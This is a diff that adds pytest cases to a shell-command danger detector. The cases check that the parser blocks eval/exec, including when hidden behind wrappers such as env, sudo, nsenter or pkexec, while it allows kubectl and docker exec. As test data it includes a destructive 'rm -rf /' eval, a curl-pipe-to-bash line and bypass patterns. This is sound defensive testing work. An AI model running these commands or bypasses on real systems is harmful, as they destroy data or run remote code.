@@ -200,3 +200,136 @@ class TestDangerousPipelineDetection:
         ast = parser.parse("/usr/bin/curl http://x.com/s | /bin/bash")
         dangers = parser.has_dangerous_constructs(ast)
         assert any("remote code execution" in d for d in dangers)
+
+
+class TestEvalExecDetection:
+    """Test eval/exec detection - command name vs argument position.
+
+    SECURITY: Shell builtins eval/exec are dangerous when they ARE the command.
+    Container tools (kubectl, docker) use 'exec' as a subcommand/argument,
+    which is a completely different security context.
+
+    This test class validates that we:
+    1. Block actual shell eval/exec commands
+    2. Allow container tools with 'exec' as argument
+    3. Detect wrapper bypass attempts (env exec, command exec)
+    """
+
+    @pytest.mark.parametrize(
+        "command,should_detect,description",
+        [
+            # === MUST BLOCK: Actual shell eval/exec commands ===
+            ("exec bash", True, "Shell exec replaces process"),
+            ("exec /bin/sh", True, "Shell exec with path"),
+            ('eval "rm -rf /"', True, "Shell eval executes string"),
+            ("eval $MALICIOUS", True, "Shell eval with variable"),
+            ("/usr/bin/exec bash", True, "Full path to exec"),
+            ("VAR=x exec bash", True, "Assignment prefix doesn't hide exec"),
+            # === MUST ALLOW: Container tools using 'exec' as argument ===
+            ("kubectl exec pod -- cat /etc/hosts", False, "kubectl exec is container tool"),
+            ("kubectl exec -it pod -- /bin/bash", False, "kubectl interactive exec"),
+            ("kubectl exec -n namespace pod -- ls", False, "kubectl exec with namespace"),
+            ("docker exec container ls", False, "docker exec is container tool"),
+            ("docker exec -it container bash", False, "docker interactive exec"),
+            ("podman exec container cat /etc/passwd", False, "podman exec"),
+            ("nerdctl exec container sh", False, "nerdctl exec"),
+            ("crictl exec container-id cat file", False, "crictl exec"),
+            # === MUST BLOCK: Wrapper command bypass attempts ===
+            ("env exec bash", True, "env wrapper bypass"),
+            ("command exec bash", True, "command wrapper bypass"),
+            ("nohup exec bash &", True, "nohup wrapper bypass"),
+            ("timeout 10 exec bash", True, "timeout wrapper bypass"),
+            ("nice exec bash", True, "nice wrapper bypass"),
+            ("sudo exec bash", True, "sudo wrapper bypass"),
+            # === MUST ALLOW: Legitimate wrapper usage (not exec/eval) ===
+            ("env VAR=x python script.py", False, "env with environment vars"),
+            ("timeout 30 curl http://example.com", False, "timeout with curl"),
+            ("nice -n 10 make build", False, "nice with make"),
+            ("nohup python server.py &", False, "nohup with python"),
+        ],
+    )
+    def test_eval_exec_detection(self, parser, command, should_detect, description):
+        """Verify eval/exec detected only as command name, not argument."""
+        ast = parser.parse(command)
+        dangers = parser.has_dangerous_constructs(ast)
+
+        has_eval_exec = any("eval command" in d or "exec command" in d or "wrapper command bypass" in d for d in dangers)
+
+        assert has_eval_exec == should_detect, (
+            f"{description}: command='{command}' expected detect={should_detect}, got {has_eval_exec}. dangers={dangers}"
+        )
+
+    def test_get_command_name_handles_assignments(self, parser):
+        """_get_command_name correctly extracts command after VAR=value prefix."""
+        ast = parser.parse("VAR=value exec bash")
+        # Get the command node
+        cmd_node = ast[0]
+        cmd_name = parser._get_command_name(cmd_node)
+        assert cmd_name == "exec", f"Expected 'exec', got '{cmd_name}'"
+
+    def test_get_command_name_handles_paths(self, parser):
+        """_get_command_name strips paths to get basename."""
+        ast = parser.parse("/usr/bin/curl http://example.com")
+        cmd_node = ast[0]
+        cmd_name = parser._get_command_name(cmd_node)
+        assert cmd_name == "curl", f"Expected 'curl', got '{cmd_name}'"
+
+    def test_compound_command_exec(self, parser):
+        """exec in compound commands (subshells, conditionals) is detected."""
+        # Subshell with exec
+        ast = parser.parse("( exec bash )")
+        dangers = parser.has_dangerous_constructs(ast)
+        assert any("exec command" in d for d in dangers), f"Subshell exec not detected: {dangers}"
+
+        # Conditional with exec
+        ast = parser.parse("if true; then exec bash; fi")
+        dangers = parser.has_dangerous_constructs(ast)
+        assert any("exec command" in d for d in dangers), f"Conditional exec not detected: {dangers}"
+
+    @pytest.mark.parametrize(
+        "command,should_detect,description",
+        [
+            # === FD Operations - MUST ALLOW (not process replacement) ===
+            ("exec 3>&1", False, "FD duplication - safe"),
+            ("exec >logfile.txt", False, "Redirect stdout - safe"),
+            ("exec 2>&1", False, "Redirect stderr - safe"),
+            ("exec 3<input.txt", False, "Open file for reading - safe"),
+            # === Position 5+ bypass attempts - MUST BLOCK ===
+            ("env A=1 B=2 C=3 D=4 exec bash", True, "Position 5 bypass"),
+            ("nice -n 19 -p 1234 exec bash", True, "Multi-flag nice bypass"),
+            ("timeout 30 --signal=KILL exec bash", True, "Multi-flag timeout bypass"),
+            # === New wrappers - MUST BLOCK ===
+            ("xargs exec bash", True, "xargs wrapper"),
+            ("parallel exec bash", True, "parallel wrapper"),
+            ("busybox exec bash", True, "busybox wrapper"),
+            ("chroot /tmp exec bash", True, "chroot wrapper - container escape"),
+            ("nsenter -t 1 exec bash", True, "nsenter wrapper - namespace escape"),
+            ("unshare -r exec bash", True, "unshare wrapper - namespace creation"),
+            ("setsid exec bash", True, "setsid wrapper"),
+            ("pkexec exec bash", True, "pkexec wrapper - privilege escalation"),
+            # === New wrapper legitimate usage - MUST ALLOW ===
+            ("xargs rm", False, "xargs legitimate use"),
+            ("parallel gzip", False, "parallel legitimate use"),
+            ("busybox ls", False, "busybox legitimate use"),
+            ("chroot /tmp ls", False, "chroot legitimate use"),
+            ("nsenter -t 1 ps", False, "nsenter legitimate use"),
+            # === Wrapper + Container Tool combinations - MUST ALLOW ===
+            # (exec is argument to container tool, not the command being run)
+            ("sudo kubectl exec pod -- ls", False, "sudo + kubectl exec"),
+            ("timeout 30 docker exec container ls", False, "timeout + docker exec"),
+            ("nice kubectl exec -it pod -- bash", False, "nice + kubectl exec"),
+            ("nice -n 10 podman exec container sh", False, "nice + podman exec"),
+            ("sudo docker exec -it mycontainer bash", False, "sudo + docker exec"),
+            ("nohup kubectl exec pod -- tail -f log &", False, "nohup + kubectl exec"),
+        ],
+    )
+    def test_bypass_vectors_and_fd_operations(self, parser, command, should_detect, description):
+        """Test security fixes for position bypass and FD operations."""
+        ast = parser.parse(command)
+        dangers = parser.has_dangerous_constructs(ast)
+
+        has_eval_exec = any("eval command" in d or "exec command" in d or "wrapper command bypass" in d for d in dangers)
+
+        assert has_eval_exec == should_detect, (
+            f"{description}: command='{command}' expected detect={should_detect}, got {has_eval_exec}. dangers={dangers}"
+        )
